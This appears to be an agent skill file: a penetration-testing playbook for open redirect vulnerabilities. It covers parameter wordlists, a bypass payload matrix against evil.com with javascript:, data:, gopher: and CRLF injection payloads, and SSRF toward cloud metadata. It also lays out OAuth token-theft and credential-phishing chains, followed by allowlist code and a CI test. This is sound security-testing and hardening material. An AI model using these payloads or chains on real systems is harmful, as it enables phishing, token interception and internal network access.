---
name: open-redirect
description: Discover, bypass, and exploit open redirect vulnerabilities — parameter wordlists, filter bypass matrix, OAuth/phishing/SSRF chains, and framework-specific hardening.
---

# Open Redirect

An open redirect exists when an application redirects a user to an attacker-controlled URL based on unsanitized input. Individually low severity, open redirects become critical when chained into OAuth token theft, credential phishing, SSO impersonation, CRLF injection, XSS, or SSRF. This skill covers end-to-end discovery, filter bypass enumeration, exploitation chains, framework-specific pitfalls, and CI-enforceable remediation.

## When to use this skill

- Testing any endpoint that redirects based on a query parameter (`?next=`, `?redirect_uri=`, `?returnTo=`) or POST body.
- Auditing login/logout, email click-tracking links, OAuth/OIDC flows, and SAML `RelayState`/`RelayTo` fields.
- Reviewing JavaScript sinks (`location`, `.assign()`, `.replace()`, `postMessage`) for client-side redirects.
- Assessing redirect-based flows for chaining into SSRF, XSS, cache poisoning, or token interception.
- Writing remediation guidance and CI regression tests for redirect allowlists.

## Methodology

### 1. Parameter discovery

Fuzz candidate parameters across high-traffic endpoints first, then breadth-crawl. Use a `/` (relative) value — a change in the response `Location` header or body proves the parameter is honored.

```text
redirect, redirect_url, redirectUri, redirect_uri, redirectUrl, redirect_to, redirectUrl, redirection, redirectUri, RedirectUrl, redirect
url, urlTo, url_target, Url, uri, uri_target, path, dest, destination, dest_url, destinationURL
next, nextUrl, next_url, Next, return, returnTo, return_to, returnUrl, return_url, returnURL, returnToUrl
continue, Continue, cont, target, Target, rurl, rUrl, r_url, forward, forwardUrl, forward_url, fwd
link, Link, goto, go, go_to, exit, exit_url, exitUrl, callback, callbackUrl, callback_url
checkout_url, checkoutUrl, checkout, continueTo, continue_to, u, out, outbound, service, origin, from
prejoinData, window, windowLocation, successUrl, success, failureUrl, fallback, landing, landingUrl, state
```

High-yield locations:

- **Auth flows** — `/login?next=`, `/logout?next=`, `/register?continue=`, SSO hand-off pages, `/auth/callback`.
- **OAuth/OIDC** — `redirect_uri`, `post_logout_redirect_uri`, `state`, `request_uri`; SAML `RelayState`, `SAMLRequest`.
- **Email links** — click-tracking wrappers (`/track?url=`, `/click?l=`), unsubscribe links, password-reset landing pages.
- **Client-side JS sinks** — `location =`, `window.location`, `.href =`, `.assign()`, `.replace()`, `location.pathname`, `document.baseURI` in `fetch`, `postMessage` handlers that consume a URL.

```js
// Quick JS recon: find redirect sinks and their input sources
// grep -rE "(location\.(href|replace|assign)|window\.open|postMessage)" static/js/
const sink = (v) => { location = v; };            // classic sink
const p = new URLSearchParams(location.search);
sink(p.get('next') || p.get('redirect_uri'));      // attacker-controlled source
```

### 2. Filter bypass matrix

Start from the exact-match baseline, then escalate. The goal is to find a syntax the host validator mis-parses but the browser resolves to the attacker's origin.

```text
https://evil.com
//evil.com
///evil.com
\/evil.com
//\evil.com
https:evil.com
https:/\evil.com
https:/evil.com
https:/evil.com;
https:/evil.com#
https:/evil.com?
https:\/\/evil.com
%2F%2Fevil.com
%2F%5C%2F
%252F%252F
https%3A%2F%2Fevil.com
%2F%2F%2Fevil.com
//%2F%2Fevil.com
//evil.com%0a
//evil.com%09
//evil.com%0d%0a
// evil.com
///evil.com;//
https://target.com@evil.com
https://target.com:80@evil.com
https://evil.com%2F..%2F
https://target.com/..%2f..%2f
https://target.com#@evil.com
https://target.com?@evil.com
/%09//evil.com
/%2f%2fevil.com
javascript://target.com/%0d%0aalert(1)
javascript:alert(document.domain)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:text/html;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
gopher://evil.com:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20evil.com%0d%0a%0d%0a
jar:http://evil.com!/foo/bar.html
```

| Class | Technique | Why it works |
|---|---|---|
| Scheme-relative | `//evil.com` | Validator checks for `http(s)://` prefix but browser treats `//` as protocol-relative. |
| Backslash | `/\evil.com`, `https:/\evil.com` | WHATWG URL spec: backslash is valid separator; Chrome/IE normalize `/\` → `//`. |
| Whitespace / control chars | `// evil.com`, `%09`, `%0a`, `%0d` | Stripped before host parsing; some filters do naive substring checks first. |
| CRLF split | `https://evil.com%0d%0a` | Smuggles a second header or splits the `Location` value. |
| Userinfo trick | `https://target.com@evil.com` | Validator sees `target.com` in the string; browser sees `evil.com` as host. |
| Port/padding | `https://target.com:80@evil.com` | Same as above with port noise to confuse regex-based validators. |
| Suffix/prefix tricks | `https://evil.target.com`, `https://target.com.evil.com` | Bypasses naive `endsWith`/`contains("target.com")` allowlists. |
| Path normalization | `https://target.com/..%2f..%2f` | Canonicalizes to attacker path after validation. |
| Fragment / query | `https://target.com#@evil.com`, `https://target.com?@evil.com` | Host check passes; fragment/query carried into `Location`. |
| Chained redirects | `https://target.com/redirect?url=evil.com` | First hop is a legitimate target redirect that hands off. |
| Rare schemes | `gopher:`, `jar:` | Validator only blocks `javascript:`/`data:`; obscure schemes slip through. |

Enumerate systematically with `ffuf` on the parameter name using the candidate values above; flag any response with an attacker-controlled `Location` header or a client-side redirect to a different origin.

### 3. Exploitation chains

- **Credential-harvest phishing** — `https://target.com/login?next=https://evil.com/creds`. The user authenticates on the real site (or is redirected mid-flow), then lands on an attacker page that mimics the SSO login prompt and captures the second-factor or the password itself.
- **OAuth token theft via `redirect_uri`** — register/point `redirect_uri` at attacker host to intercept the `code`; attempt the **mix-up attack** (reuse code across a second IdP); exploit a missing/weak `state` validation by replaying the code. Chained with an open redirect on the IdP to redirect code to attacker.
- **CRLF → header/session injection** — `?next=%0d%0aSet-Cookie:+x=1` to inject `Set-Cookie` (session fixation) or `Location` splitting into a second response header.
- **XSS via scheme abuse** — `javascript://target.com/%0d%0aalert(1)` or `data:text/html;base64,…` when the validator only blocks `http(s)`-less values.
- **SSRF chaining** — the server fetches the redirect target. Use `https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/` to reach cloud metadata endpoints, or internal-only hosts via the redirect proxy.
- **Cache poisoning** — submit a poisoned redirect into a cached response (`X-Forwarded-Host`, `Vary: User-Agent`) so the poisoned URL is served to other users.
- **Referer leak** — open redirect strips or preserves `Referer`; combine with a chain that leaks tokens embedded in the URL fragment or query string.
- **Client-side open redirect** — abuse `window.name`/`postMessage` handlers to redirect via an iframe; useful when the server-side redirect is patched but the client sink remains.
- **`/logout?next=` destructive clicks** — the user is silently logged out; chains with CSRF to kill sessions during an active attack window.
- **Redirect-based lazy CSRF** — CSRF token is issued/validated, then the user is redirected to an attacker host; token ends up in the attacker's logs via the query string.
- **HTTPOnly cookie leak** — chain an open redirect with a subdomain takeover; the browser carries HTTPOnly cookies to the attacker-controlled subdomain of the same parent domain.

### 4. Framework notes

```python
# Django
# is_safe_url / url_has_allowed_host_and_scheme — historical CVEs (e.g. CVE-2017-7233/7234)
# bypass via malformed scheme handling: "\\\\evil.com", "https:/\\evil.com", "////evil.com"
from django.utils.http import url_has_allowed_host_and_scheme
url_has_allowed_host_and_scheme(url, allowed_hosts={'target.com'})
# CVE-2019-3498: still parses "\\\\evil.com" as same-host in some versions
```

```ruby
# Rails
redirect_to params[:url]        # classic open redirect — no allowlist
redirect_to(params[:redirect_to], allow_other_host: true) # Rails 7+ opt-in guard
# legacy: redirect_to host: params[:host], only_path: false — bypassable
```

```java
// Spring
response.sendRedirect(request.getParameter("url")); // attacker-controlled Location
// Spring Security: use RedirectAuthenticationSuccessHandler with explicit allowlist
```

```js
// Express
res.redirect(req.query.url);    // res.redirect('http://evil.com') → 302 with attacker Location
// never pass raw query params; normalize and allowlist first
```

```csharp
// ASP.NET
Response.Redirect(Request.QueryString["ReturnUrl"]); // classic ReturnUrl open redirect
// LocalRedirect() is the safe primitive — refuses off-origin targets
```

```js
// Next.js
// next(redirect(`/next?url=${req.query.url}`)) — check allowlist before composing
// Middleware: reject absolute URLs and protocol-relative inputs explicitly
```

### 5. Remediation

- **Fixed allowlist** — the only robust pattern. Map opaque keys to destinations; never accept a raw URL.
- **No user input in `Location`** — build the redirect server-side from the allowlist lookup, not from the request.
- **OAuth `state` tokens** — bind `state` to the session, validate on callback, reject mismatched or missing values.
- **Validate scheme + host exactly** — after canonicalization, require `https` and an exact match against the allowlist.
- **Reject protocol-relative and backslash forms** — block `//`, `/\`, and `\\` prefixes before comparison.
- **Canonicalize before compare** — resolve the URL (scheme, host, port, path) before allowlist matching; strip fragments/credentials.
- **CI test cases** — feed the entire bypass matrix above into the redirect endpoint; assert no attacker-controlled `Location` or client-side hop.

```js
// Canonical allowlist check (Node)
const ALLOWED = new Set(['target.com', 'accounts.target.com']);
function isSafeRedirect(u) {
  try {
    const url = new URL(u, 'https://target.com');      // base resolves relative paths
    if (url.protocol !== 'https:') return false;        // scheme pinned
    if (url.username || url.password) return false;     // no userinfo tricks
    return ALLOWED.has(url.hostname);                    // exact host match
  } catch { return false; }
}
```

```python
# CI regression: feed the bypass matrix, assert no attacker origin in Location
BYPASS = ['//evil.com', '/\\evil.com', 'https:/\\evil.com', 'https://target.com@evil.com',
          'https://evil.target.com', 'https://target.com.evil.com', 'javascript:alert(1)',
          'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==']
def test_no_open_redirect(client):
    for p in BYPASS:
        r = client.get('/login', params={'next': p}, allow_redirects=False)
        loc = r.headers.get('Location', '')
        assert 'evil.com' not in loc, f'Bypass survived: {p} -> {loc}'
```

## Tooling

```bash
# Burp param-miner — automated parameter discovery on high-traffic endpoints
# Burp Match/Replace rule to surface redirect behavior:
#   Match:  Location: https://target.com/
#   Replace: Location: //evil.com
# ffuf — enumerate parameter names against a known-good endpoint
ffuf -u 'https://target.com/login?FUZZ=/' -w params.txt -mr 'Location: /' -mc 200,302
# Grep JS bundles for redirect sinks, then trace the data flow manually
npx linkfinder -i https://target.com/main.js -o cli
grep -rnE 'location(\.href|\.replace|\.assign)?\s*=' static/js/
grep -rn 'postMessage' static/js/ | grep -iE 'url|redirect|next|href'
```

## Verification & Deliverables

**PoC** — capture the full request → redirect chain with `curl -sIL` showing the attacker-controlled `Location`, or a browser screenshot of the final page on the attacker origin. For OAuth chains, document the `code`/`token` landing on attacker infrastructure. For CRLF, show the injected header in the raw response.

**Impact** — quantify: credential phishing against SSO users, OAuth/OIDC code and token interception, session fixation via `Set-Cookie` injection, XSS execution on the trusted origin, internal network reach via server-side redirect fetch, cache poisoning reach, and silent session destruction via `/logout` chains. Map each chain to the OWASP Top 10 / ASVS v4 (5.5.2, 12.4.1) and note CVSS for the highest-impact chain.

**Remediation** — hand over the allowlist implementation (Node/Django/Java/C# above), the CI regression suite, and a one-pager: pin scheme, canonicalize, exact host match, reject protocol-relative/backslash/userinfo, rotate any OAuth client secrets whose `redirect_uri` was exploitable, and re-run the full bypass matrix as a post-fix acceptance test.
